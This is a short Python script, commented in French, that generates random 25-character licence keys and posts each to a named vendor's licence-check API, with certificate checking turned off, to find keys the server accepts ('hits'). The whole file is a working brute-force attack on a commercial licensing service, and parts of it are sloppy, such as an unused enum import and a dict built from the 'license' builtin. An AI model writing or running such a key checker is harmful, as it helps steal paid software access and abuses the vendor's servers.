from enum import verify

import requests
import urllib3
import random
import string

Data = {
  "licenseKey": license,
  "version": "0.0.1.8"
}
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def generer_code():
    caracteres = string.ascii_letters + string.digits  # A-Z + a-z + 0-9
    return ''.join(random.choices(caracteres, k=25))

def check_key(code):
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    resp = requests.post("https://onlybot.store/api/connexion_beta.php", json={
  "licenseKey": code,
  "version": "0.0.1.8"
}, verify=False)
    try:
        data = resp.json()
        if data.get("ok connection"):
            print("Nouveau hit : " + code)
        else:
            print("Fail")
    except ValueError:
        print("Erreur de l'api , verifiez votre connexion internet ou proxy")


nombre = int(input("Combien de codes voulez-vous générer ? "))

codes = [generer_code() for _ in range(nombre)]

with open("onlyauth.txt", "w") as fichier:
    for code in codes:
        fichier.write(code + "\n")

print(f"{nombre} codes ont été générés et sauvegardés dans onlyauth.txt")
print("Démarrage du checker...")

with open("onlyauth.txt", "r") as fichier:
    for ligne in fichier:
        code = ligne.strip()  # On enlève les espaces et retours à la ligne
        check_key(code)

print("Tout les clés ont été verifiés")